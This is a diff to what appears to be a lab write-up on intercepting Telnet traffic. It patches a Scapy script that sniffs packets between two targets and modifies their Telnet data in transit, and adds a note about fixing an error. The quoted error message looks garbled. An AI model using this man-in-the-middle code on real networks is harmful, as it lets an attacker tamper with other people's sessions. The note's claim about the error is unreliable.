@@ -148,7 +148,7 @@ host_m_mac = '02:42:0a:09:00:69'
 
 # Define the Telnet data modification function
 def modify_telnet_data(pkt):
-    if IP in pkt and TCP in pkt and pkt[IP].src == target_a_ip and pkt[IP].dst == target_b_ip:
+    if IP in pkt and TCP in pkt and pkt[IP].src == target_a_ip and pkt[IP].dst == target_b_ip and pkt[TCP].payload:
         # Extract the Telnet data from the TCP packet
         telnet_data = pkt[TCP].payload.load.decode(errors='ignore')
 
@@ -172,4 +172,6 @@ filter_str = 'tcp and src host {} and dst host {} and dst port 23'.format(target
 sniff(prn=modify_telnet_data, filter=filter_str, store=0)
 ```
 
-Thank you to my followers.
+This updated script should prevent any ```AttributeError: 'bytes' object has no attribute '__iterlen__'``` error from occurring. </br>
+However, it may not prevent other errors or issues that may arise from running the script. I will continue testing further.
+
